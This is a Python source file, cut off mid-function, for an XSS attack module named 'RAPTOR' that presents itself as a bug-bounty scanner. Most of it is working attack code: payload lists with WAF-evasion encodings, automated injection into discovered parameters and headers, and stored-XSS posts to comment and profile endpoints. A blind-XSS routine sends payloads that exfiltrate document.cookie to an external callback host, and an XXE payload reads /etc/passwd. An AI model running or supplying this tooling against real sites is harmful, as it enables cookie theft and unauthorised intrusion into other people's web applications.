#!/usr/bin/env python3
"""
RAPTOR XSS Testing Module v2.0 
=================================================================
Advanced XSS detection with polymorphic payloads, WAF evasion, 
and multi-context analysis. Zero external dependencies.
"""

import re
import html
import random
import string
import hashlib
import asyncio
import itertools
from typing import List, Dict, Optional, Set, Tuple, Callable, Any
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote
from core.base_module import BaseModule, Finding

@dataclass
class XSSPayload:
    """Advanced XSS payload with evasion metadata"""
    payload: str
    context: str  # html, attribute, script, url, style, js-template, json, xml
    encoding_chain: List[str] = field(default_factory=list)  # multi-layer encoding
    waf_bypass_techniques: List[str] = field(default_factory=list)
    severity: str = 'High'
    requires_interaction: bool = False
    browser_specific: Optional[str] = None  # chrome, firefox, safari, edge
    
    def __post_init__(self):
        if not self.encoding_chain:
            self.encoding_chain = ['raw']

class XSSTester(BaseModule):
    """
    S-Tier XSS Detection Engine
    - Polymorphic payload generation
    - Context-aware injection points
    - WAF/IPS evasion techniques
    - Blind XSS detection
    - CSP bypass testing
    """
    
    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        
        # Advanced tracking
        self.tested_params: Set[str] = set()
        self.tested_vectors: Set[str] = set()
        self.reflection_cache: Dict[str, Any] = {}
        self.waf_signatures: Set[str] = set()
        
        # Payload databases
        self.payloads = self._initialize_payload_db()
        self.polygenerators = self._init_polygenerators()
        self.encoding_strategies = self._init_encoding_strategies()
        
        # Evasion configuration
        self.evasion_level = config.get('evasion_level', 3)  # 1-5
        self.use_blind_xss = config.get('blind_xss', True)
        self.blind_xss_callback = config.get('blind_callback', 'https://xsshunter.tracker/callback')
        
    def _initialize_payload_db(self) -> Dict[str, List[XSSPayload]]:
        """Initialize comprehensive payload database with evasion variants"""
        
        # Base payloads organized by context
        base_payloads = {
            'html': [
                ('<script>alert(1)</script>', 'High', []),
                ('<img src=x onerror=alert(1)>', 'High', []),
                ('<svg onload=alert(1)>', 'High', []),
                ('<body onload=alert(1)>', 'High', []),
                ('<iframe src=javascript:alert(1)>', 'High', []),
                ('<input onfocus=alert(1) autofocus>', 'High', ['interaction']),
                ('<select onfocus=alert(1) autofocus>', 'High', ['interaction']),
                ('<textarea onfocus=alert(1) autofocus>', 'High', ['interaction']),
                ('<keygen onfocus=alert(1) autofocus>', 'High', ['interaction']),
                ('<video><source onerror=alert(1)>', 'High', []),
                ('<audio src=x onerror=alert(1)>', 'High', []),
                ('<marquee onstart=alert(1)>', 'Medium', []),
                ('<details ontoggle=alert(1) open>', 'Medium', ['interaction']),
                ('<meter onmouseover=alert(1)>', 'Medium', ['interaction']),
                ('<progress onmouseover=alert(1) value=1 max=2>', 'Medium', ['interaction']),
            ],
            'attribute': [
                ('" onfocus=alert(1) autofocus="', 'High', []),
                ("' onmouseover='alert(1)'", 'Medium', ['interaction']),
                ('" onload="alert(1)"', 'High', []),
                ('" onerror="alert(1)"', 'High', []),
                ('" autofocus onfocus="alert(1)"', 'High', []),
                ("' autofocus onfocus='alert(1)'", 'High', []),
                ('javascript:alert(1)', 'Medium', []),
                ('data:text/html,<script>alert(1)</script>', 'High', []),
            ],
            'script': [
                ('";alert(1);//', 'Critical', []),
                ("';alert(1);//", 'Critical', []),
                ('\';alert(1);//', 'Critical', []),
                ('${alert(1)}', 'Critical', []),
                ('`alert(1)`', 'Critical', []),
                ('"+alert(1)+"', 'Critical', []),
                ("'+alert(1)+'", 'Critical', []),
                ('</script><script>alert(1)</script>', 'Critical', []),
                ('\x3cscript\x3ealert(1)\x3c/script\x3e', 'Critical', ['encoding']),
            ],
            'js_template': [
                ('${alert(1)}', 'Critical', []),
                ('{{constructor.constructor("alert(1)")()}}', 'Critical', []),
                ('<%=alert(1)%>', 'Critical', []),
                ('${constructor.constructor("alert(1)")()}', 'Critical', []),
            ],
            'url': [
                ('javascript:alert(1)', 'High', []),
                ('javascript://%0aalert(1)', 'High', ['bypass']),
                ('javascript://%0d%0aalert(1)', 'High', ['bypass']),
                ('data:text/html,<script>alert(1)</script>', 'High', []),
                ('vbscript:msgbox(1)', 'Medium', ['ie_only']),
            ],
            'style': [
                ('expression(alert(1))', 'High', ['ie_only']),
                ('-moz-binding(url("//xss.ht"))', 'Medium', ['firefox_only']),
                ('</style><script>alert(1)</script>', 'High', []),
            ],
            'json': [
                ('{"__proto__":{"isAdmin":true}}', 'High', ['prototype_pollution']),
                ('{"constructor":{"prototype":{"isAdmin":true}}}', 'High', ['prototype_pollution']),
            ],
            'xml': [
                ('<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>', 'Critical', ['xxe']),
                ('<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>', 'High', []),
            ]
        }
        
        # Generate polymorphic variants
        payloads = {}
        for context, items in base_payloads.items():
            payloads[context] = []
            for payload, severity, tags in items:
                # Create base payload
                xp = XSSPayload(
                    payload=payload,
                    context=context,
                    severity=severity,
                    waf_bypass_techniques=tags
                )
                payloads[context].append(xp)
                
                # Generate encoded variants if not already encoded
                if 'encoding' not in tags:
                    payloads[context].extend(self._generate_encoded_variants(payload, context, severity))
                    
        return payloads
    
    def _generate_encoded_variants(self, payload: str, context: str, severity: str) -> List[XSSPayload]:
        """Generate multi-layer encoded payload variants"""
        variants = []
        
        # URL encoding variants
        variants.append(XSSPayload(
            payload=quote(payload, safe=''),
            context=context,
            encoding_chain=['url_encode'],
            waf_bypass_techniques=['url_encoding'],
            severity=severity
        ))
        
        # Double URL encoding
        variants.append(XSSPayload(
            payload=quote(quote(payload, safe=''), safe=''),
            context=context,
            encoding_chain=['url_encode', 'url_encode'],
            waf_bypass_techniques=['double_encoding'],
            severity=severity
        ))
        
        # HTML entities
        html_encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
        variants.append(XSSPayload(
            payload=html_encoded,
            context=context,
            encoding_chain=['html_entities_hex'],
            waf_bypass_techniques=['html_encoding'],
            severity=severity
        ))
        
        # Unicode escapes
        if context == 'script':
            unicode_escaped = ''.join(f'\\u{ord(c):04x}' for c in payload)
            variants.append(XSSPayload(
                payload=unicode_escaped,
                context=context,
                encoding_chain=['unicode_escape'],
                waf_bypass_techniques=['unicode_encoding'],
                severity=severity
            ))
            
        # Mixed encoding
        mixed = payload.replace('<', '%3c').replace('>', '%3e')
        variants.append(XSSPayload(
            payload=mixed,
            context=context,
            encoding_chain=['partial_url_encode'],
            waf_bypass_techniques=['mixed_encoding'],
            severity=severity
        ))
        
        return variants
    
    def _init_polygenerators(self) -> Dict[str, Callable]:
        """Initialize polymorphic payload generators"""
        return {
            'alert_obfuscation': self._gen_alert_obfuscation,
            'tag_bypass': self._gen_tag_bypass,
            'event_handler_bypass': self._gen_event_handler_bypass,
            'protocol_bypass': self._gen_protocol_bypass,
        }
    
    def _gen_alert_obfuscation(self) -> str:
        """Generate obfuscated alert() calls"""
        techniques = [
            'alert(1)',
            'alert`1`',
            '(alert)(1)',
            'window["alert"](1)',
            'top["alert"](1)',
            'self["alert"](1)',
            'parent["alert"](1)',
            'alert.call(null, 1)',
            'alert.apply(null, [1])',
            'Function("alert(1)")()',
            'eval("alert(1)")',
            'setTimeout("alert(1)")',
            'setInterval("alert(1)")',
        ]
        return random.choice(techniques)
    
    def _gen_tag_bypass(self) -> str:
        """Generate tag bypass techniques"""
        tags = [
            ('img', 'src=x onerror={}'),
            ('svg', 'onload={}'),
            ('body', 'onload={}'),
            ('input', 'autofocus onfocus={}'),
            ('video', 'src=x onerror={}'),
            ('audio', 'src=x onerror={}'),
            ('iframe', 'src=javascript:{}'),
            ('object', 'data=javascript:{}'),
            ('embed', 'src=javascript:{}'),
        ]
        tag, template = random.choice(tags)
        payload = self._gen_alert_obfuscation()
        return f'<{tag} {template.format(payload)}>'
    
    def _gen_event_handler_bypass(self) -> str:
        """Generate event handler bypasses"""
        handlers = [
            'onerror', 'onload', 'onfocus', 'onblur', 'onchange',
            'onclick', 'ondblclick', 'onkeydown', 'onkeypress', 'onkeyup',
            'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover',
            'onmouseup', 'onresize', 'onscroll', 'onselect', 'onsubmit'
        ]
        handler = random.choice(handlers)
        payload = self._gen_alert_obfuscation()
        return f'{handler}={payload}'
    
    def _gen_protocol_bypass(self) -> str:
        """Generate protocol bypasses"""
        protocols = [
            'javascript:',
            'javascript://',
            'javascript://%0a',
            'javascript://%0d%0a',
            'data:text/html,',
            'vbscript:',
            'mocha:',
            'livescript:',
        ]
        proto = random.choice(protocols)
        return f'{proto}<script>alert(1)</script>'
    
    def _init_encoding_strategies(self) -> Dict[str, Callable[[str], str]]:
        """Initialize encoding strategies"""
        return {
            'none': lambda x: x,
            'url_encode': lambda x: quote(x, safe=''),
            'double_url_encode': lambda x: quote(quote(x, safe=''), safe=''),
            'html_entities_decimal': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'html_entities_hex': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
            'hex_entities_no_semicolon': lambda x: ''.join(f'&#x{ord(c):x}' for c in x),
            'unicode_escape': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'unicode_surrogate': lambda x: ''.join(f'\\u{ord(c):04x}' if ord(c) < 0x10000 else f'\\u{0xd800 + ((ord(c) - 0x10000) >> 10):04x}\\u{0xdc00 + ((ord(c) - 0x10000) & 0x3ff):04x}' for c in x),
            'base64': lambda x: f'eval(atob("{x.encode().hex()}"))' if False else x,  # Placeholder for complex encoding
            'mixed_case': lambda x: ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
            'null_byte': lambda x: x.replace('<', '%00<'),
            'tab_newline': lambda x: x.replace(' ', '\t').replace('=', '=\n'),
        }
    
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Execute comprehensive XSS testing"""
        self.logger.info("🚀 RAPTOR S-Tier XSS Testing Module v2.0")
        self.logger.info("=" * 60)
        
        scope = kwargs.get('scope', 'comprehensive')  # quick, standard, comprehensive, aggressive
        
        # Phase 1: Reconnaissance
        self.logger.info("🔍 Phase 1: Advanced Reconnaissance")
        endpoints = await self._discover_endpoints(target)
        self.logger.info(f"   Discovered {len(endpoints)} endpoints")
        
        # Phase 2: Parameter Discovery
        self.logger.info("🔍 Phase 2: Deep Parameter Discovery")
        params = await self._deep_parameter_discovery(target, endpoints)
        self.logger.info(f"   Found {len(params.get('url_params', []))} URL params, {len(params.get('forms', []))} forms")
        
        # Phase 3: WAF Detection
        self.logger.info("🛡️ Phase 3: WAF/IPS Fingerprinting")
        waf_info = await self._fingerprint_waf(target)
        self.logger.info(f"   WAF detected: {waf_info.get('type', 'None')}")
        
        # Phase 4: Reflected XSS Testing
        self.logger.info("🎯 Phase 4: Reflected XSS Analysis")
        await self._advanced_reflected_testing(target, params, waf_info)
        
        # Phase 5: DOM-based XSS
        self.logger.info("🌳 Phase 5: DOM-based XSS Detection")
        await self._advanced_dom_testing(target, endpoints)
        
        # Phase 6: Blind XSS
        if self.use_blind_xss:
            self.logger.info("👁️ Phase 6: Blind XSS Injection")
            await self._blind_xss_testing(target, params)
        
        # Phase 7: Header-based XSS
        self.logger.info("📋 Phase 7: Header Injection Vectors")
        await self._advanced_header_testing(target)
        
        # Phase 8: Stored XSS (if enabled)
        if kwargs.get('stored_test', False):
            self.logger.info("💾 Phase 8: Stored XSS Testing")
            await self._advanced_stored_testing(target, params)
        
        # Phase 9: CSP Bypass Testing
        self.logger.info("🔓 Phase 9: CSP Bypass Evaluation")
        await self._csp_bypass_testing(target)
        
        self.logger.info(f"✅ Testing complete. Total findings: {len(self.findings)}")
        return self.findings
    
    async def _discover_endpoints(self, target: str) -> List[str]:
        """Discover additional endpoints via crawling and brute force"""
        endpoints = {target}
        
        # Common XSS endpoints
        common_paths = [
            '/search', '/query', '/find', '/lookup',
            '/comment', '/review', '/feedback', '/contact',
            '/profile', '/user', '/account', '/settings',
            '/api', '/graphql', '/rest', '/v1',
            '/sitemap', '/rss', '/feed', '/xml',
            '/upload', '/import', '/export', '/backup',
            '/admin', '/panel', '/dashboard', '/manage',
            '/test', '/dev', '/debug', '/console',
        ]
        
        # Crawl for links
        try:
            response = await self._make_request(target)
            if response:
                body = await response.text()
                
                # Extract all links
                links = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', body, re.I)
                for link in links:
                    full_url = urljoin(target, link)
                    if full_url.startswith(target):
                        endpoints.add(full_url)
                        
                # Extract API endpoints from JS
                api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
                endpoints.update(urljoin(target, p) for p in api_patterns)
                
        except Exception as e:
            self.logger.debug(f"Crawl error: {e}")
        
        # Test common paths
        for path in common_paths:
            test_url = urljoin(target, path)
            try:
                resp = await self._make_request(test_url, method='HEAD')
                if resp and resp.status in [200, 401, 403, 405]:
                    endpoints.add(test_url)
            except:
                pass
                
        return list(endpoints)
    
    async def _deep_parameter_discovery(self, target: str, endpoints: List[str]) -> Dict:
        """Deep parameter discovery with heuristics"""
        discovered = {
            'url_params': set(),
            'forms': [],
            'json_params': set(),
            'xml_params': set()
        }
        
        # Common parameter names organized by category
        param_wordlists = {
            'standard': ['id', 'page', 'search', 'query', 'name', 'email', 'url', 'redirect'],
            'xss_specific': ['callback', 'jsonp', 'cb', 'function', 'handler', 'action'],
            'html_context': ['title', 'description', 'content', 'message', 'comment', 'body'],
            'url_context': ['next', 'return', 'returnUrl', 'return_to', 'redir', 'link'],
            'api_params': ['q', 's', 'term', 'keyword', 'filter', 'sort', 'order'],
        }
        
        all_params = set(itertools.chain(*param_wordlists.values()))
        
        # Check each endpoint
        for endpoint in endpoints[:10]:  # Limit to prevent timeout
            try:
                # Test parameter reflection
                test_marker = f"RAPTOR{random.randint(1000, 9999)}"
                for param in list(all_params)[:20]:  # Sample params
                    test_url = f"{endpoint}?{param}={test_marker}"
                    resp = await self._make_request(test_url)
                    
                    if resp:
                        body = await resp.text()
                        if test_marker in body:
                            discovered['url_params'].add(param)
                            self.reflection_cache[f"{endpoint}:{param}"] = {
                                'context': self._analyze_context_advanced(body, test_marker),
                                'reflected': True
                            }
                            
                # Extract forms
                resp = await self._make_request(endpoint)
                if resp:
                    body = await resp.text()
                    forms = re.findall(
                        r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>(.*?)</form>',
                        body, re.DOTALL | re.I
                    )
                    discovered['forms'].extend(forms)
                    
            except Exception as e:
                self.logger.debug(f"Discovery error on {endpoint}: {e}")
        
        discovered['url_params'] = list(discovered['url_params'])
        return discovered
    
    async def _fingerprint_waf(self, target: str) -> Dict:
        """Fingerprint WAF/IPS systems"""
        waf_info = {'type': None, 'blocking_rules': []}
        
        # Test payloads to identify blocking behavior
        test_payloads = [
            ('<script>alert(1)</script>', 'xss_basic'),
            ('../../etc/passwd', 'path_traversal'),
            ('UNION SELECT', 'sqli'),
            ('${jndi:ldap', 'log4j'),
        ]
        
        blocking_patterns = []
        
        for payload, attack_type in test_payloads:
            try:
                test_url = f"{target}?test={quote(payload)}"
                resp = await self._make_request(test_url)
                
                if resp:
                    if resp.status in [403, 406, 501, 999]:
                        blocking_patterns.append(attack_type)
                    body = await resp.text()
                    if any(x in body.lower() for x in ['blocked', 'waf', 'firewall', 'security', 'incident']):
                        waf_info['type'] = 'generic'
                        
            except Exception as e:
                if '403' in str(e) or 'blocked' in str(e).lower():
                    blocking_patterns.append(attack_type)
        
        if blocking_patterns:
            waf_info['blocking_rules'] = blocking_patterns
            if not waf_info['type']:
                waf_info['type'] = 'unknown'
                
        return waf_info
    
    async def _advanced_reflected_testing(self, target: str, params: Dict, waf_info: Dict):
        """Advanced reflected XSS testing with context awareness"""
        
        url_params = params.get('url_params', [])
        
        for param in url_params:
            if param in self.tested_params:
                continue
                
            self.tested_params.add(param)
            
            # Get context from cache or detect
            cache_key = f"{target}:{param}"
            if cache_key in self.reflection_cache:
                context_info = self.reflection_cache[cache_key]
            else:
                # Probe for context
                probe = f"RAPTOR{hash(param) % 10000}"
                test_url = f"{target}?{param}={probe}"
                try:
                    resp = await self._make_request(test_url)
                    if not resp:
                        continue
                    body = await resp.text()
                    context_info = {
                        'context': self._analyze_context_advanced(body, probe),
                        'reflected': probe in body
                    }
                except Exception as e:
                    self.logger.debug(f"Context detection error: {e}")
                    continue
            
            if not context_info.get('reflected'):
                continue
                
            context = context_info['context']
            self.logger.info(f"   Testing {param} in {context} context")
            
            # Select payloads based on context and WAF
            payloads = self._select_payloads(context, waf_info)
            
            # Test each payload with evasion
            for payload_obj in payloads:
                if await self._test_payload_evasion(target, param, payload_obj, waf_info):
                    break  # Stop on first success for this param
    
    def _analyze_context_advanced(self, body: str, marker: str) -> Dict:
        """Advanced context analysis with precise positioning"""
        pos = body.find(marker)
        if pos == -1:
            return {'type': 'unknown', 'details': {}}
        
        window = 200
        before = body[max(0, pos-window):pos]
        after = body[pos+len(marker):pos+len(marker)+window]
        
        context = {'type': 'html', 'details': {}}
        
        # Check for HTML tags
        if re.search(r'<[^>]*$', before) and re.search(r'^[^<]*>', after):
            tag_match = re.search(r'<([a-zA-Z][a-zA-Z0-9]*)[^>]*$', before)
            if tag_match:
                context['details']['parent_tag'] = tag_match.group(1)
            context['type'] = 'html'
            
        # Check for attributes
        attr_match = re.search(r'(\w+)=["\'][^"\']*$', before)
        if attr_match and re.search(r'^[^"\']*["\']', after):
            context['type'] = 'attribute'
            context['details']['attribute_name'] = attr_match.group(1)
            
        # Check for script context
        script_before = before.lower().rfind('<script')
        script_after = after.lower().find('</script>')
        if script_before > -1 and (script_after > -1 or script_after == -1):
            context['type'] = 'script'
            # Check if inside string
            quotes = before.count('"') + before.count("'")
            if quotes % 2 == 1:
                context['details']['in_string'] = True
                
        # Check for URL context
        url_match = re.search(r'(href|src|action|formaction)=["\'][^"\']*$', before, re.I)
        if url_match:
            context['type'] = 'url'
            context['details']['url_attribute'] = url_match.group(1)
            
        # Check for style context
        style_before = before.lower().rfind('<style')
        style_after = after.lower().find('</style>')
        if style_before > -1:
            context['type'] = 'style'
            
        # Check for template contexts
        if '{{' in before or '}}' in after:
            context['type'] = 'js_template'
            context['details']['template_type'] = 'angular'
        if '${' in before:
            context['type'] = 'js_template'
            context['details']['template_type'] = 'es6'
            
        return context
    
    def _select_payloads(self, context_info: Dict, waf_info: Dict) -> List[XSSPayload]:
        """Select optimal payloads based on context and WAF"""
        context_type = context_info.get('type', 'html')
        base_payloads = self.payloads.get(context_type, self.payloads['html'])
        
        # If WAF detected, prioritize bypass techniques
        if waf_info.get('type'):
            bypass_payloads = [p for p in base_payloads if p.waf_bypass_techniques]
            if bypass_payloads:
                # Sort by evasion level
                bypass_payloads.sort(key=lambda x: len(x.waf_bypass_techniques), reverse=True)
                return bypass_payloads[:10]
        
        # Generate polymorphic variants
        polymorphic = []
        for _ in range(5):
            poly = XSSPayload(
                payload=self.polygenerators['tag_bypass'](),
                context=context_type,
                waf_bypass_techniques=['polymorphic'],
                severity='High'
            )
            polymorphic.append(poly)
            
        return base_payloads[:15] + polymorphic
    
    async def _test_payload_evasion(self, target: str, param: str, payload_obj: XSSPayload, waf_info: Dict) -> bool:
        """Test payload with multiple evasion strategies"""
        
        # Generate evasion variants based on level
        variants = self._generate_evasion_variants(payload_obj)
        
        for variant in variants:
            test_url = f"{target}?{param}={self._apply_encoding(variant)}"
            
            try:
                resp = await self._make_request(test_url)
                if not resp:
                    continue
                    
                body = await resp.text()
                
                if self._confirm_xss_advanced(body, variant, payload_obj.context):
                    self._create_advanced_finding(
                        target, param, payload_obj, 
                        payload_obj.context, 'Reflected',
                        evidence={'variant_used': variant}
                    )
                    return True
                    
            except Exception as e:
                self.logger.debug(f"Payload test error: {e}")
                
        return False
    
    def _generate_evasion_variants(self, payload_obj: XSSPayload) -> List[str]:
        """Generate evasion variants based on configuration"""
        variants = [payload_obj.payload]
        
        if self.evasion_level >= 2:
            # Case randomization
            variants.append(''.join(
                c.upper() if random.choice([True, False]) else c.lower() 
                for c in payload_obj.payload
            ))
            
        if self.evasion_level >= 3:
            # Tab/newline insertion
            variants.append(payload_obj.payload.replace(' ', '\t'))
            variants.append(payload_obj.payload.replace(' ', '\n'))
            
        if self.evasion_level >= 4:
            # Null byte injection
            variants.append(payload_obj.payload.replace('<', '%00<'))
            
        if self.evasion_level >= 5:
            # Maximum obfuscation
            variants.append(self._maximum_obfuscation(payload_obj.payload))
            
        return list(set(variants))
    
    def _maximum_obfuscation(self, payload: str) -> str:
        """Apply maximum obfuscation techniques"""
        # Multi-layer encoding
        result = payload
        result = result.replace('alert', 'top["al"+"ert"]')
        result = result.replace('(', '&#40;')
        result = result.replace(')', '&#41;')
        return result
    
    def _apply_encoding(self, payload: str) -> str:
        """Apply appropriate encoding"""
        # Smart encoding based on payload content
        if '<' in payload or '>' in payload:
            return quote(payload, safe='')
        return payload
    
    def _confirm_xss_advanced(self, body: str, payload: str, context: str) -> bool:
        """Advanced XSS confirmation with context validation"""
        # Decode body for analysis
        decoded = unquote(body)
        
        # Check for script execution indicators
        execution_indicators = [
            r'<script[^>]*>[^<]*alert\s*\(\s*1\s*\)',
            r'on\w+\s*=\s*["\']?[^"\']*alert\s*\(\s*1\s*\)',
            r'javascript\s*:\s*alert\s*\(\s*1\s*\)',
        ]
        
        for pattern in execution_indicators:
            if re.search(pattern, decoded, re.I):
                return True
                
        # Context-specific validation
        if context == 'script':
            if re.search(r'[;\n]\s*alert\s*\(\s*1\s*\)', decoded):
                return True
        elif context == 'attribute':
            if re.search(r'\s\w+\s*=\s*["\'][^"\']*alert', decoded):
                return True
                
        return False
    
    async def _advanced_dom_testing(self, target: str, endpoints: List[str]):
        """Advanced DOM-based XSS detection"""
        
        # DOM sink patterns
        dom_sinks = {
            'execution': ['eval(', 'Function(', 'setTimeout(', 'setInterval('],
            'html': ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write'],
            'url': ['location', 'location.href', 'location.replace', 'location.assign'],
            'cookie': ['document.cookie'],
            'postMessage': ['postMessage(', 'addEventListener("message"'],
        }
        
        for endpoint in endpoints[:5]:
            try:
                resp = await self._make_request(endpoint)
                if not resp:
                    continue
                    
                body = await resp.text()
                
                # Check for DOM sinks
                found_sinks = {}
                for category, patterns in dom_sinks.items():
                    for pattern in patterns:
                        if pattern in body:
                            if category not in found_sinks:
                                found_sinks[category] = []
                            found_sinks[category].append(pattern)
                
                if found_sinks:
                    # Test for DOM XSS via hash/fragment
                    await self._test_dom_vectors(endpoint, found_sinks)
                    
            except Exception as e:
                self.logger.debug(f"DOM test error: {e}")
    
    async def _test_dom_vectors(self, endpoint: str, sinks: Dict):
        """Test specific DOM XSS vectors"""
        
        vectors = [
            '#<img src=x onerror=alert(1)>',
            '#javascript:alert(1)',
            '#%3Cimg%20src=x%20onerror=alert(1)%3E',
            '#/redirect?next=javascript:alert(1)',
        ]
        
        for vector in vectors:
            test_url = f"{endpoint}{vector}"
            try:
                resp = await self._make_request(test_url)
                if resp:
                    # Check if vector reaches sink
                    body = await resp.text()
                    if any(sink in body for sink_list in sinks.values() for sink in sink_list):
                        self._create_advanced_finding(
                            endpoint, 'hash_fragment', 
                            XSSPayload(vector, 'dom', severity='High'),
                            'dom', 'DOM-based',
                            evidence={'sinks_found': sinks}
                        )
            except Exception:
                pass
    
    async def _blind_xss_testing(self, target: str, params: Dict):
        """Test for blind XSS with callback server"""
        
        blind_payloads = [
            f'<script src="{self.blind_xss_callback}?id={{id}}"></script>',
            f'<img src=x onerror="fetch(\'{self.blind_xss_callback}?c=\'+document.cookie)">',
            f"eval(atob('ZmV0Y2goJ3tjb2xsZWN0b3J9PycrZG9jdW1lbnQuY29va2llKQ=='))",
        ]
        
        # Inject into all parameters
        for param in params.get('url_params', [])[:10]:
            for payload_template in blind_payloads:
                payload = payload_template.replace('{id}', f"{target}_{param}")
                test_url = f"{target}?{param}={quote(payload)}"
                
                try:
                    await self._make_request(test_url)
                    self.logger.info(f"   Injected blind XSS into {param}")
                except Exception:
                    pass
    
    async def _advanced_header_testing(self, target: str):
        """Advanced header-based XSS testing"""
        
        headers_to_test = {
            'User-Agent': 'Mozilla/5.0 XSS_TEST',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'Referer': 'https://evil.com/',
            'X-Forwarded-Host': 'evil.com',
            'X-HTTP-Host-Override': 'evil.com',
            'Forwarded': 'for=evil.com',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
        }
        
        marker = f"HDR{hash(target) % 10000}"
        
        # First pass: detect reflection
        reflecting_headers = []
        for header, value in headers_to_test.items():
            try:
                headers = {header: f"{value}{marker}"}
                resp = await self._make_request(target, headers=headers)
                
                if resp:
                    body = await resp.text()
                    if marker in body:
                        reflecting_headers.append(header)
                        context = self._analyze_context_advanced(body, marker)
                        
                        # Attempt exploitation
                        await self._exploit_header(target, header, context)
                        
            except Exception as e:
                self.logger.debug(f"Header test error: {e}")
    
    async def _exploit_header(self, target: str, header: str, context: Dict):
        """Exploit header reflection"""
        payloads = self._select_payloads(context, {})
        
        for payload_obj in payloads:
            try:
                headers = {header: payload_obj.payload}
                resp = await self._make_request(target, headers=headers)
                
                if resp:
                    body = await resp.text()
                    if self._confirm_xss_advanced(body, payload_obj.payload, context.get('type', 'html')):
                        self._create_advanced_finding(
                            target, header, payload_obj,
                            context.get('type', 'html'), 'Header-based'
                        )
                        return
            except Exception:
                pass
    
    async def _advanced_stored_testing(self, target: str, params: Dict):
        """Advanced stored XSS testing"""
        
        entry_points = [
            ('/comment', {'content': 'PAYLOAD'}),
            ('/review', {'review': 'PAYLOAD', 'rating': 5}),
            ('/post', {'title': 'PAYLOAD', 'body': 'PAYLOAD'}),
            ('/message', {'message': 'PAYLOAD'}),
            ('/profile', {'bio': 'PAYLOAD'}),
            ('/feedback', {'feedback': 'PAYLOAD'}),
        ]
        
        stored_marker = f"STORED{hash(target) % 100000}"
        payload = f"<script>alert('{stored_marker}')</script>"
        
        for endpoint, data_template in entry_points:
            url = urljoin(target, endpoint)
            data = {k: v.replace('PAYLOAD', payload) for k, v in data_template.items()}
            
            try:
                resp = await self._make_request(url, method='POST', data=data)
                if resp and resp.status in [200, 201, 302, 303]:
                    
                    # Wait for storage
                    await asyncio.sleep(2)
                    
                    # Check multiple locations
                    check_urls = [
                        target,
                        url,
                        urljoin(target, '/comments'),
                        urljoin(target, '/feed'),
                        urljoin(target, '/api/posts'),
                    ]
                    
                    for check_url in check_urls:
                        check_resp = await self._make_request(check_url)
                        if check_resp:
                            body = await check_resp.text()
                            if stored_marker in body:
                                self._create_advanced_finding(
                                    url, 'stored_content',
                                    XSSPayload(payload, 'html', severity='Critical'),
                                    'html', 'Stored',
                                    evidence={'endpoint': endpoint, 'stored_in': check_url}
                                )
                                return
                                
            except Exception as e:
                self.logger.debug(f"Stored XSS error: {e}")
    
    async def _csp_bypass_testing(self, target: str):
        """Test for CSP bypass opportunities"""
        
        try:
            resp = await self._make_request(target)
            if not resp:
                return
                
            csp_header = resp.headers.get('Content-Security-Policy', '')
            csp_report = resp.headers.get('Content-Security-Policy-Report-Only', '')
            
            if not csp_header and not csp_report:
                return
                
            csp = csp_header or csp_report
            
            # Analyze CSP weaknesses
            weaknesses = []
            
            if "'unsafe-inline'" in csp:
                weaknesses.append('unsafe-inline')
            if "'unsafe-eval'" in csp:
                weaknesses.append('unsafe-eval')
            if 'data:' in csp:
                weaknesses.append('data-scheme')
            if not csp or "default-src *" in csp:
                weaknesses.append('permissive-default')
                
            # Check for JSONP endpoints that might bypass
            jsonp_endpoints = [
                '/api/jsonp', '/callback', '/jsonp', '/api/feed',
            ]
            
            for endpoint in jsonp_endpoints:
                test_url = urljoin(target, f"{endpoint}?callback=alert")
                try:
                    test_resp = await self._make_request(test_url)
                    if test_resp:
                        body = await test_resp.text()
                        if body.startswith('alert('):
                            weaknesses.append(f'jsonp-{endpoint}')
                except Exception:
                    pass
                    
            if weaknesses:
                self.logger.warning(f"   CSP Weaknesses found: {weaknesses}")
                
        except Exception as e:
            self.logger.debug(f"CSP test error: {e}")
    
    def _create_advanced_finding(self, target: str, param: str, payload: XSSPayload, 
                                context: str, xss_type: str, evidence: Dict = None):
        """Create comprehensive XSS finding"""
        
        severity_map = {
            'Stored': 'Critical',
            'DOM-based': 'High',
            'Reflected': payload.severity,
            'Header-based': 'High',
            'Blind': 'High'
        }
        
        cvss_map = {
            'Stored': 9.1,
            'DOM-based': 7.1,
            'Reflected': 6.1,
            'Header-based': 6.5,
            'Blind': 7.5
        }
        
        bounty_map = {
            'Stored': 5000,
            'DOM-based': 2500,
            'Reflected': 1500,
            'Header-based': 2000,
            'Blind': 3000
        }
        
        finding = Finding(
            module='xss_advanced',
            title=f"[{xss_type}] XSS in '{param}' parameter ({context} context)",
            severity=severity_map.get(xss_type, 'High'),
            description=self._generate_description(param, payload, context, xss_type),
            evidence={
                'parameter': param,
                'payload': payload.payload,
                'context': context,
                'type': xss_type,
                'encoding': payload.encoding_chain,
                'waf_bypass': payload.waf_bypass_techniques,
                **(evidence or {})
            },
            poc=self._generate_poc(target, param, payload),
            remediation=self._generate_remediation(context, xss_type),
            cvss_score=cvss_map.get(xss_type, 6.1),
            bounty_score=bounty_map.get(xss_type, 1500),
            target=target
        )
        
        self.add_finding(finding)
        self.logger.critical(f"🚨 XSS CONFIRMED: {xss_type} in {param} ({context})")
        
        # Add to graph if available
        if self.graph:
            self.graph.add_vulnerability(
                target=target,
